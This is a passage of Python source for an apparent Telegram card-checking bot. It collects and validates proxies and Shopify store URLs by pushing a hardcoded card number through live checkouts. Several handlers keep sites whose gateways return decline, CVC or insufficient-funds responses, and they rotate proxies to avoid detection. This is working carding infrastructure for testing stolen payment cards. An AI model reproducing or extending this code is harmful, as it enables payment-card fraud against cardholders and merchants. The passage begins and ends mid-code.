        print(f"🔍 Testing: {site_url}")  # Console debug
        
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        print(f"   → Full URL: {site_url}")
        
        r = requests.get(
            f"{site_url}/products.json?limit=5",
            timeout=timeout,
            verify=False
        )
        
        print(f"   → Status: {r.status_code}")
        
        if r.status_code != 200:
            print(f"   ❌ HTTP {r.status_code}")
            return False
        
        data = r.json()
        products = data.get('products', [])
        print(f"   → Products found: {len(products)}")
        
        available = False
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    available = True
                    print(f"   ✅ Found available product: {p.get('title', 'Unknown')}")
                    break
            if available:
                break
        
        if available:
            print(f"   ✅ VALID SITE")
        else:
            print(f"   ❌ No available products")
        
        return available
        
    except Exception as e:
        print(f"   ❌ Exception: {str(e)}")
        return False

    
# ==========================================
# REPLACE handle_add_proxy_command IN app.py
# ==========================================

@bot.message_handler(commands=['addpro'])
def handle_add_proxy_command(message):
    """
    Handle /addpro command - Adds a single proxy with STRICT validation.
    """
    try:
        # 1. Parse Input
        if " " not in message.text:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/addpro ip:port:user:pass</code>", parse_mode='HTML')
            return
        
        proxy = message.text.split(' ', 1)[1].strip()
        
        # 2. Validate Format
        parts = proxy.split(':')
        if len(parts) not in [2, 4]:
            bot.reply_to(message, "❌ <b>Format Error:</b> Use <code>ip:port</code> or <code>ip:port:user:pass</code>", parse_mode='HTML')
            return

        status_msg = bot.reply_to(message, f"⏳ <b>Checking Proxy:</b> <code>{parts[0]}</code>...", parse_mode='HTML')

        # 3. Run Check in Thread (to not block bot)
        def check_and_save():
            try:
                # Format proxy for requests
                if len(parts) == 2:
                    formatted = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                
                proxies_dict = {'http': formatted, 'https': formatted}
                
                # STRICT CHECK against Google (5s timeout)
                start_t = time.time()
                r = requests.get("http://www.google.com", proxies=proxies_dict, timeout=5)
                ping = int((time.time() - start_t) * 1000)
                
                if r.status_code == 200:
                    # ✅ Proxy is Live -> Save it
                    if proxy not in proxies_data['proxies']:
                        proxies_data['proxies'].append(proxy)
                        save_json(PROXIES_FILE, proxies_data)
                        
                        bot.edit_message_text(
                            f"✅ <b>Proxy Added!</b>\n\n"
                            f"🌐 <code>{parts[0]}</code>\n"
                            f"⚡ Ping: {ping}ms\n"
                            f"📦 Total Proxies: {len(proxies_data['proxies'])}",
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                    else:
                        bot.edit_message_text(
                            f"⚠️ <b>Duplicate Proxy</b>\n\n"
                            f"🌐 <code>{parts[0]}</code> is already in the database.",
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                else:
                    raise Exception("Status not 200")

            except Exception as e:
                # ❌ Proxy is Dead
                bot.edit_message_text(
                    f"❌ <b>Dead Proxy</b>\n\n"
                    f"🌐 <code>{parts[0]}</code> could not connect.\n"
                    f"<i>Not saved to database.</i>",
                    message.chat.id, status_msg.message_id, parse_mode='HTML'
                )

        # Start the thread
        threading.Thread(target=check_and_save).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
@bot.message_handler(commands=['addproxies'])
def handle_mass_proxy_upload(message):
    """Mass add proxies from a TXT file to the SERVER database"""
    if not is_owner(message.from_user.id):
        return

    bot.reply_to(message, "📂 <b>Send a .txt file containing proxies.</b>\nFormat: <code>ip:port:user:pass</code>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_proxy_file_upload)


def process_proxy_file_upload(message):
    """
    Mass add proxies from TXT file with VALIDATION.
    Checks proxies before saving them to the database.
    """
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Invalid file. Please send a .txt file.")
            return

        status_msg = bot.reply_to(message, "⏳ <b>Downloading and Reading file...</b>", parse_mode='HTML')
        
        # 1. Download and Parse
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        raw_proxies = list(set([line.strip() for line in content.split('\n') if ':' in line]))
        total_found = len(raw_proxies)
        
        if total_found == 0:
            bot.edit_message_text("❌ No valid proxies found in file.", message.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(f"⚡ <b>Checking {total_found} proxies...</b>\n<i>This may take a moment.</i>", message.chat.id, status_msg.message_id, parse_mode='HTML')

        # 2. Define Fast Checker
        live_proxies = []
        
        def check_single_proxy(proxy):
            try:
                parts = proxy.split(':')
                if len(parts) == 2:
                    formatted = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    return None
                
                proxies_dict = {'http': formatted, 'https': formatted}
                
                # Check against Google for speed (5s timeout)
                r = requests.get("http://www.google.com", proxies=proxies_dict, timeout=5)
                if r.status_code == 200:
                    return proxy
            except:
                pass
            return None

        # 3. Run Checks concurrently (Fast)
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_single_proxy, p) for p in raw_proxies]
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                if result:
                    live_proxies.append(result)
                
                # Update UI every 50 checks
                if i % 50 == 0:
                    try:
                        bot.edit_message_text(
                            f"⚡ <b>Checking Proxies...</b>\n"
                            f"Total: {total_found}\n"
                            f"Checked: {i}/{total_found}\n"
                            f"✅ Live: {len(live_proxies)}", 
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                    except: pass

        # 4. Save only LIVE proxies
        added_count = 0
        for proxy in live_proxies:
            if proxy not in proxies_data['proxies']:
                proxies_data['proxies'].append(proxy)
                added_count += 1
        
        save_json(PROXIES_FILE, proxies_data)
        
        # 5. Final Report
        bot.edit_message_text(
            f"✅ <b>Proxy Import Complete</b>\n\n"
            f"📥 Uploaded: {total_found}\n"
            f"🟢 Live: {len(live_proxies)}\n"
            f"🔴 Dead: {total_found - len(live_proxies)}\n"
            f"🆕 Added to DB: {added_count}\n"
            f"📦 Total Database: {len(proxies_data['proxies'])}",
            message.chat.id,
            status_msg.message_id,
            parse_mode='HTML'
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['groups'])
def handle_list_groups(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    
    if not groups_data:
        bot.reply_to(message, "No approved groups found.")
        return
    
    # Check if groups_data is properly structured
    if not isinstance(groups_data, dict):
        bot.reply_to(message, "❌ Error: Groups data format is invalid.")
        return
    
    groups_list = "<b>👥 Approved Groups:</b>\n\n"
    
    for chat_id, data in groups_data.items():
        # Check if data is a dictionary
        if not isinstance(data, dict):
            groups_list += f"🆔 <code>{chat_id}</code>\n"
            groups_list += f"📛 Title: Invalid data format\n"
            groups_list += "━━━━━━━━━━━━━━━━━━━\n"
            continue
            
        try:
            approved_date = datetime.fromisoformat(data.get('approved_date', datetime.now().isoformat()))
            title = data.get('title', 'Unknown Group')
            
            groups_list += f"🆔 <code>{chat_id}</code>\n"
            groups_list += f"📛 Title: {title}\n"
            groups_list += f"📅 Approved: {approved_date.strftime('%Y-%m-%d')}\n"
            groups_list += "━━━━━━━━━━━━━━━━━━━\n"
        except Exception as e:
            groups_list += f"🆔 <code>{chat_id}</code>\n"
            groups_list += f"📛 Title: Error parsing data\n"
            groups_list += f"❌ Error: {str(e)}\n"
            groups_list += "━━━━━━━━━━━━━━━━━━━\n"
    
    bot.reply_to(message, groups_list, parse_mode='HTML')

def extract_urls(text):
    """
    Extract valid URLs from text that might contain jumbled/waste characters
    """
    # Split the text and look for potential URLs
    parts = text.split()
    potential_urls = []
    
    # Remove the command itself
    if parts and parts[0] == '/addurls':
        parts = parts[1:]
    
    # Try to find URLs in each part
    for part in parts:
        # Clean the part by removing non-URL characters from start/end
        cleaned = clean_string(part)
        
        # Check if it looks like a URL
        if is_likely_url(cleaned):
            # Ensure it has a scheme
            if not cleaned.startswith(('http://', 'https://')):
                cleaned = 'https://' + cleaned
            potential_urls.append(cleaned)
    
    return potential_urls

def clean_string(s):
    """
    Remove junk characters from the start and end of a string
    """
    # Remove non-alphanumeric characters from start
    while s and not s[0].isalnum():
        s = s[1:]
    
    # Remove non-alphanumeric characters from end
    while s and not s[-1].isalnum():
        s = s[:-1]
    
    return s

def is_likely_url(s):
    """
    Check if a string is likely to be a URL
    """
    # Check for common TLDs
    tlds = ['.com', '.org', '.net', '.io', '.gov', '.edu', '.info', '.co', '.uk', '.us', '.ca', '.au', '.de', '.fr']
    
    # Check if it contains a TLD
    has_tld = any(tld in s for tld in tlds)
    
    # Check if it has a domain structure
    has_domain_structure = '.' in s and len(s.split('.')) >= 2
    
    # Check if it's not too short
    not_too_short = len(s) > 4
    
    return (has_tld or has_domain_structure) and not_too_short


def process_add_sites(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide URLs to add. Format: /addurls <url1> <url2> ...")
        return
    
    # Extract and clean URLs from the message
    raw_text = message.text
    urls = extract_urls(raw_text)
    
    if not urls:
        bot.reply_to(message, "No valid URLs found in your message.")
        return
    
    added_count = 0
    total_count = len(urls)
    
    # Send initial processing message
    status_msg = bot.reply_to(message, f"🔍 Checking {total_count} sites...\n\nAdded: 0/{total_count}\nSkipped: 0/{total_count}")
    
    skipped_count = 0
    
    # Get a random proxy for testing sites
    proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
    
    for i, url in enumerate(urls):
        # Update status message
        try:
            bot.edit_message_text(
                f"🔍 Checking {total_count} sites...\n\nChecking: {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        # Test the URL with a sample card USING PROXY
        test_cc = "5242430428405662|03|28|323"
        
        # Use the proxy when checking the site
        response = check_site_shopify_direct(url, test_cc, proxy)
        
        if response:
            response_upper = response.get("Response", "").upper()
            # Check if response is valid
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 'INCORRECT_NUMBER', "INVALID_TOKEN", "AUTHENTICATION_ERROR"]):
                
                # Get price from response or use default
                price = response.get("Price", "0.00")
                
                # Check if site already exists
                site_exists = any(site['url'] == url for site in sites_data['sites'])
                
                if not site_exists:
                    # Add site to list
                    sites_data['sites'].append({
                        "url": url,
                        "price": price,
                        "last_response": response.get("Response", "Unknown"),
                        "gateway": response.get("Gateway", "Unknown"),
                        "tested_with_proxy": proxy if proxy else "No proxy"
                    })
                    added_count += 1
                    
                    # Update status with success
                    try:
                        if proxy:
                            bot.edit_message_text(
                                f"🔍 Checking {total_count} sites...\n\n✅ Added with proxy: {url}\nProxy: {proxy.split(':')[0] if proxy else 'No proxy'}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                                chat_id=message.chat.id,
                                message_id=status_msg.message_id
                            )
                        else:
                            bot.edit_message_text(
                                f"🔍 Checking {total_count} sites...\n\n✅ Added (no proxy): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                                chat_id=message.chat.id,
                                message_id=status_msg.message_id
                            )
                    except:
                        pass
                else:
                    skipped_count += 1
                    # Update status with skip (duplicate)
                    try:
                        bot.edit_message_text(
                            f"🔍 Checking {total_count} sites...\n\n⚠️ Skipped (duplicate): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
            else:
                skipped_count += 1
                # Update status with skip (invalid response)
                try:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ Skipped (invalid): {url}\nResponse: {response.get('Response', 'NO_RESPONSE')}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        else:
            skipped_count += 1
            # Update status with skip (no response)
            try:
                if proxy:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ Skipped (no response with proxy): {url}\nProxy: {proxy.split(':')[0] if proxy else 'No proxy'}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                else:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ Skipped (no response): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
            except:
                pass
        
        # Small delay to avoid rate limiting
        time.sleep(1)
    
    # Save updated sites
    save_json(SITES_FILE, sites_data)
    
    # Final update with proxy info
    if proxy:
        final_message = f"✅ Site Checking Completed with Proxy!\n\nProxy Used: {proxy.split(':')[0]}\nAdded: {added_count} new sites\nSkipped: {skipped_count} sites\nTotal Sites: {len(sites_data['sites'])}"
    else:
        final_message = f"✅ Site Checking Completed (No Proxy Available)!\n\nAdded: {added_count} new sites\nSkipped: {skipped_count} sites\nTotal Sites: {len(sites_data['sites'])}"
    
    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )


def process_single_proxy(bot, message, proxy):
    """Repaired Smart Proxy Adder: Async-safe and robust validation"""
    def run_validation():
        try:
            # 1. Validate Format
            proxy_str = proxy.strip()
            parts = proxy_str.split(':')
            if len(parts) not in [2, 4]:
                bot.edit_message_text("❌ Format: ip:port:user:pass", message.chat.id, message.message_id)
                return

            status_msg_id = message.message_id
            host = parts[0]
            user_id = str(message.chat.id) 
            
            # 2. Basic Connectivity Test (Using your fixed test_proxy_connectivity)
            # We use a 5-10s timeout here to keep the bot snappy
            is_alive = test_proxy_connectivity(proxy_str)
            
            if not is_alive:
                bot.edit_message_text(f"❌ <b>Dead Proxy:</b> Connection failed.", message.chat.id, status_msg_id, parse_mode='HTML')
                return

            # 3. Shopify Quality Check
            is_shopify_working = False
            shopify_response = "Skipped"
            
            # Use random site from your loaded sites_data
            if sites_data.get('sites'):
                try:
                    site_obj = random.choice(sites_data['sites'])
                    bot.edit_message_text(f"✅ Connected! Testing Shopify...", message.chat.id, status_msg_id)
                    
                    # Direct check
                    response = check_site_shopify_direct(site_obj['url'], "5242430428405662|03|28|323", proxy_str)
                    
                    response_str = str(response).upper() if response else ""
                    valid_keywords = ['DECLINED', 'APPROVED', 'INSUFFICIENT', 'CVV', 'INCORRECT', 'FUNDS']
                    
                    if any(k in response_str for k in valid_keywords):
                        is_shopify_working = True
                        shopify_response = "Live Gateway"
                    else:
                        shopify_response = "Bad Response"
                except:
                    shopify_response = "Check Failed"
            
            # 4. Save Logic (Personal and Server)
            # Ensure dictionary exists in memory
            if user_id not in user_proxies_data:
                user_proxies_data[user_id] = []
                
            if proxy_str not in user_proxies_data[user_id]:
                user_proxies_data[user_id].append(proxy_str)
                save_json(USER_PROXIES_FILE, user_proxies_data)
                
            if proxy_str not in proxies_data['proxies']:
                proxies_data['proxies'].append(proxy_str)
                save_json(PROXIES_FILE, proxies_data)

            # 5. Final UI Update
            emoji = "🔥" if is_shopify_working else "✅"
            shop_status = "<b>Working</b>" if is_shopify_working else shopify_response
            
            msg = (f"{emoji} <b>Proxy Added Successfully</b>\n\n"
                   f"🌐 <code>{host}</code>\n"
                   f"✅ Connectivity: <b>Live</b>\n"
                   f"🛍️ Shopify: {shop_status}")
            
            bot.edit_message_text(msg, message.chat.id, status_msg_id, parse_mode='HTML')

        except Exception as e:
            logger.error(f"Proxy Add Thread Error: {e}")

    # Launch in thread to prevent bot freezing
    threading.Thread(target=run_validation).start()


def process_proxy_file_checking(bot, message, proxies_list, status_msg):
    """Test proxies from file one by one with live progress"""
    try:
        total_proxies = len(proxies_list)
        added = 0
        duplicates = 0
        failed = 0
        
        start_time = time.time()
        
        try:
            bot.edit_message_text(
                f"🔍 Starting proxy testing...\n\nTotal to test: {total_proxies}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        time.sleep(0.5)
        
        for idx, proxy in enumerate(proxies_list, 1):
            proxy = proxy.strip()
            if not proxy or proxy.startswith('#'):
                continue
            
            proxy_parts = proxy.split(':')
            if len(proxy_parts) != 4:
                failed += 1
                continue
            
            host = proxy_parts[0]
            port = proxy_parts[1]
            
            try:
                progress_text = format_proxy_progress(
                    idx, total_proxies, 
                    added, duplicates, failed,
                    f"Testing {host}:{port}..."
                )
                bot.edit_message_text(
                    progress_text,
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
            
            if not test_proxy_connectivity(proxy):
                failed += 1
                continue
            
            if sites_data.get('sites') and len(sites_data['sites']) > 0:
                try:
                    site_obj = random.choice(sites_data['sites'])
                    test_cc = "5242430428405662|03|28|323"
                    response = test_proxy_with_api(site_obj['url'], test_cc, proxy)
                    
                    if response:
                        response_upper = str(response).upper() if isinstance(response, (str, dict)) else ""
                        if isinstance(response, dict):
                            response_upper = response.get("Response", "").upper()
                        
                        valid_responses = [
                            'CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD',
                            'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS',
                            'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED',
                            'INCORRECT_NUMBER', 'INVALID_TOKEN', 'AUTHENTICATION_ERROR'
                        ]
                        
                        if any(x in response_upper for x in valid_responses):
                            if proxy not in proxies_data['proxies']:
                                proxies_data['proxies'].append(proxy)
                                added += 1
                            else:
                                duplicates += 1
                        else:
                            failed += 1
                    else:
                        failed += 1
                except:
                    failed += 1
            else:
                failed += 1
            
            time.sleep(0.3)
        
        try:
            save_json(PROXIES_FILE, proxies_data)
        except:
            logger.error("Failed to save proxies")
        
        duration = time.time() - start_time
        
        try:
            final_msg = format_proxy_final_results(
                total_proxies, added, duplicates, failed, 
                duration, len(proxies_data['proxies'])
            )
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
    
    except Exception as e:
        try:
            bot.reply_to(message, f"❌ Error during proxy checking: {str(e)}")
        except:
            logger.error(f"Error: {e}")


def format_proxy_progress(current, total, added, duplicates, failed, current_status):
    """Format proxy testing progress"""
    percent = (current / total * 100) if total > 0 else 0
    bar_length = 20
    filled = int(bar_length * current / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_length - filled)
    
    return f"""
┏━━━━━━━⍟
┃ <b>🔍 PROXY TESTING</b> ⚡
┗━━━━━━━━━━━⊛

<code>{bar}</code>
<b>Progress:</b> {current}/{total} ({percent:.1f}%)

<b>Status:</b> {current_status}

<b>Results So Far:</b>
[⌬] <b>✅ Added</b>↣ {added}
[⌬] <b>⚠️ Duplicates</b>↣ {duplicates}
[⌬] <b>❌ Failed</b>↣ {failed}

⏳ Testing...
"""


def format_proxy_final_results(total, added, duplicates, failed, duration, total_proxies):
    """Format final proxy testing results"""
    speed = (total / duration) if duration > 0 else 0
    
    return f"""
┏━━━━━━━⍟
┃ <b>✅ PROXY TESTING COMPLETED</b>
┗━━━━━━━━━━━⊛

<b>━━━ RESULTS ━━━</b>
[⌬] <b>✅ Added</b>↣ {added} 🎉
[⌬] <b>⚠️ Duplicates</b>↣ {duplicates} ⚠️
[⌬] <b>❌ Failed</b>↣ {failed} ❌
[⌬] <b>Tested</b>↣ {total}

<b>━━━ STATS ━━━</b>
[⌬] <b>Duration</b>↣ {duration:.2f}s
[⌬] <b>Speed</b>↣ {speed:.1f} proxies/sec
[⌬] <b>Total Proxies Saved</b>↣ {total_proxies} 💾

━━━━━━━━━━━━━━━━━━━━
"""


# def test_proxy_connectivity(proxy):
#     """Test if proxy can connect"""
#     try:
#         proxy_parts = proxy.split(':')
#         if len(proxy_parts) != 4:
#             return False
        
#         host, port, user, password = proxy_parts
#         proxy_url = f"http://{user}:{password}@{host}:{port}"
        
#         session = requests.Session()
#         response = session.get(
#             "https://api.ipify.org",
#             proxies={'https': proxy_url, 'http': proxy_url},
#             timeout=10,
#             verify=False
#         )
#         return response.status_code == 200
#     except:
#         return False


# def test_proxy_with_api(url, cc, proxy):
#     """Test proxy with API call"""
#     try:
#         proxy_parts = proxy.split(':')
#         if len(proxy_parts) != 4:
#             return None
        
#         host, port, user, password = proxy_parts
#         proxy_url = f"http://{user}:{password}@{host}:{port}"
        
#         session = requests.Session()
#         response = session.post(
#             url,
#             data={'cc': cc},
#             proxies={'https': proxy_url, 'http': proxy_url},
#             timeout=15,
#             verify=False
#         )
        
#         try:
#             return response.json()
#         except:
#             return response.text if response.text else None
#     except:
#         return None

def test_proxy_connectivity(proxy):
    """Test if proxy can connect"""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) != 4:
            return False
        
        host, port, user, password = proxy_parts
        proxy_url = f"http://{user}:{password}@{host}:{port}"
        
        session = requests.Session()
        response = session.get(
            "https://api.ipify.org",
            proxies={'https': proxy_url, 'http': proxy_url},
            timeout=20,
            verify=False
        )
        return response.status_code == 200
    except:
        return False


def test_proxy_with_api(site_url, test_cc, proxy):
    """
    Test proxy using direct Shopify checkout (no external API)
    """
    return check_site_shopify_direct(site_url, test_cc, proxy)



def test_proxy_connectivity(proxy):
    """Test if proxy is reachable"""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            proxy_dict = {
                'http': f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}',
                'https': f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}'
            }
            
            # Test with a simple HTTP request
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=20,
                verify=False
            )
            return response.status_code == 200
    except:
        pass
    
    return False

        

@bot.message_handler(commands=['testproxy'])
def handle_test_proxy(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Owner only command.")
        return
        
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /testproxy host:port:user:pass")
        return
    
    proxy = message.text.split(' ', 1)[1]
    proxy_parts = proxy.split(':')
    
    if len(proxy_parts) != 4:
        bot.reply_to_message(message, "Invalid proxy format")
        return
    
    status_msg = bot.reply_to(message, "🔍 Running comprehensive proxy test...")
    
    tests = []
    
    # Test 1: Basic connectivity
    try:
        test1 = test_proxy_connectivity(proxy)
        tests.append(f"✅ Connectivity: {'PASS' if test1 else 'FAIL'}")
    except Exception as e:
        tests.append(f"❌ Connectivity: ERROR - {str(e)}")
    
    # Test 2: Direct API call
    try:
        site_obj = random.choice(sites_data['sites']) if sites_data['sites'] else None
        if site_obj:
            response = check_site_shopify_direct(site_obj['url'], "5242430428405662|03|28|323", proxy)
            tests.append(f"✅ Direct API: {'PASS' if response and is_valid_response(response) else 'FAIL'}")
            if response:
                tests.append(f"   Response: {response.get('Response', 'None')}")
        else:
            tests.append("❌ Direct API: No sites available")
    except Exception as e:
        tests.append(f"❌ Direct API: ERROR - {str(e)}")
    
    # Test 3: Proxy dict method
    try:
        if site_obj:
            response = check_site_shopify_direct(site_obj['url'], "5242430428405662|03|28|323", proxy)
            tests.append(f"✅ Proxy Dict: {'PASS' if response and is_valid_response(response) else 'FAIL'}")
            if response:
                tests.append(f"   Response: {response.get('Response', 'None')}")
    except Exception as e:
        tests.append(f"❌ Proxy Dict: ERROR - {str(e)}")
    
    # Compile results
    result_text = f"🔍 Proxy Test Results for {proxy_parts[0]}:\n\n" + "\n".join(tests)
    bot.edit_message_text(result_text, chat_id=message.chat.id, message_id=status_msg.message_id)

@bot.message_handler(commands=['clean'])
def handle_clean_sites(message):
    if not is_owner(message.from_user.id):
        return
    
    # Correctly call the function here
    thread = threading.Thread(target=process_clean_sites, args=(message,))
    thread.start()

# ==========================================
# REPLACE process_clean_proxies IN app.py
# ==========================================

def process_clean_proxies(message):
    try:
        # Load current proxies
        if not proxies_data['proxies']:
            bot.reply_to(message, "❌ No proxies found to clean. Add some first!")
            return

        total_proxies = len(proxies_data['proxies'])
        status_msg = bot.reply_to(message, f"🧹 **Starting Proxy Cleaning...**\nChecking {total_proxies} proxies.", parse_mode='Markdown')
        
        valid_proxies = []
        test_cc = "5242430428405662|03|28|323"  # Test CC (Dead/Random)
        
        # We need a site to test against.
        if not sites_data['sites']:
            bot.edit_message_text("❌ No sites available. Add sites first using /addurls", message.chat.id, status_msg.message_id)
            return

        # Use the first available site or random
        site_obj = random.choice(sites_data['sites'])
        site_url = site_obj['url']
        
        print(f"🧹 Cleaning Proxies using site: {site_url}")

        for i, proxy in enumerate(proxies_data['proxies']):
            # Update UI every 10 proxies
            if i % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"🧹 **Cleaning Proxies...**\n\n"
                        f"Target: {site_url}\n"
                        f"Total: {total_proxies}\n"
                        f"Checked: {i}\n"
                        f"✅ Live: {len(valid_proxies)}\n"
                        f"❌ Dead: {i - len(valid_proxies)}",
                        chat_id=message.chat.id, 
                        message_id=status_msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass

            try:
                # === CALL THE CHECKER ===
                # We expect a dict, but might get None, str, or tuple
                response = check_site_shopify_direct(site_url, test_cc, proxy)
                
                # === ROBUST RESPONSE PARSING ===
                response_str = ""
                
                if isinstance(response, dict):
                    # Combine all values to search for keywords
                    response_str = (str(response.get('message', '')) + " " + str(response.get('status', ''))).upper()
                elif isinstance(response, tuple):
                    # Join tuple elements
                    response_str = " ".join(str(x) for x in response).upper()
                elif isinstance(response, str):
                    response_str = response.upper()
                elif response is None:
                    response_str = "CONNECTION_ERROR"
                
                # === DECISION LOGIC ===
                # If we get ANY generic gateway response, the proxy is alive.
                # If we get a connection error, proxy error, or timeout, it's dead.
                
                dead_keywords = [
                    'PROXY_ERROR', 'CONNECTTIMEOUT', 'READTIMEOUT', 
                    'CONNECTION REFUSED', 'MAX RETRIES', 'HOST UNREACHABLE',
                    'CANNOT CONNECT', 'TUNNEL CONNECTION FAILED'
                ]
                
                # These mean the request reached the gateway -> Proxy is GOOD
                live_keywords = [
                    'DECLINED', 'APPROVED', 'INSUFFICIENT', 'SECURITY CODE',
                    'INCORRECT', 'INVALID', 'CARD', 'FUNDS', 'MATCH', 
                    'ZIP', 'AVS', 'STOCK', 'LOGIN', 'ERROR' 
                ]
                
                is_dead = any(k in response_str for k in dead_keywords)
                is_live = any(k in response_str for k in live_keywords)
                
                # Specific logic: If it's NOT explicitly dead, and contains live keywords, keep it.
                if not is_dead and is_live:
                    valid_proxies.append(proxy)
                    # print(f"✅ Live: {proxy} | Resp: {response_str[:50]}") # Debug
                else:
                    pass
                    # print(f"❌ Dead: {proxy} | Resp: {response_str[:50]}") # Debug

            except Exception as e:
                print(f"⚠️ Error checking proxy {proxy}: {e}")


        # === SAVE RESULTS ===
        proxies_data['proxies'] = valid_proxies
        save_json(PROXIES_FILE, proxies_data)
        
        bot.edit_message_text(
            f"✅ **Cleaning Finished!**\n\n"
            f"🗑 Removed: {total_proxies - len(valid_proxies)}\n"
            f"💎 Live Saved: {len(valid_proxies)}",
            chat_id=message.chat.id, 
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Critical Error in CleanPro: {e}")
        traceback.print_exc()

def process_clean_sites(message):
    try:
        if not sites_data['sites']:
            bot.reply_to(message, "❌ No sites to clean.")
            return

        total_sites = len(sites_data['sites'])
        status_msg = bot.reply_to(message, f"🧹 **Cleaning {total_sites} sites...**", parse_mode='Markdown')
        
        valid_sites = []
        test_cc = "5242430428405662|03|28|323" # Test CC
        
        for i, site_obj in enumerate(sites_data['sites']):
            # Update Status every 10 sites
            if i % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"🧹 **Cleaning Sites...**\n\n"
                        f"Checking: {site_obj['url']}\n"
                        f"Progress: {i}/{total_sites}\n"
                        f"✅ Valid: {len(valid_sites)}\n"
                        f"❌ Dead: {i - len(valid_sites)}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass
            
            try:
                # Check the site
                # We use a random proxy if available, or None
                proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
                response = check_site_shopify_direct(site_obj['url'], test_cc, proxy)
                
                # === SAFE RESPONSE HANDLING (Prevents Crashes) ===
                response_str = ""
                gateway_found = "Unknown"
                
                if isinstance(response, dict):
                    # If it's a dictionary (New Fix)
                    response_str = str(response.get('Response', '')) + " " + str(response.get('message', ''))
                    gateway_found = response.get('gateway', 'Shopify Payments')
                elif isinstance(response, tuple):
                    # If it's a tuple (Old Version)
                    response_str = " ".join(str(x) for x in response)
                    if len(response) > 2:
                        gateway_found = str(response[2])
                elif isinstance(response, str):
                    response_str = response
                
                response_upper = response_str.upper()

                # === VALIDATION LOGIC ===
                # If we get these, the site is ALIVE (even if card is declined)
                valid_keywords = [
                    'DECLINED', 'APPROVED', 'INSUFFICIENT', 'SECURITY CODE',
                    'INCORRECT', 'INVALID', 'CARD', 'FUNDS', 'MATCH', 
                    'ZIP', 'AVS', 'STOCK', 'LOGIN', 'ERROR', 'AUTHENTICATION', 
                    'VOUCHER', 'CVV'
                ]
                
                # If we get these, the site/proxy is DEAD
                dead_keywords = [
                    'PROXY_ERROR', 'CONNECTTIMEOUT', 'READTIMEOUT', 
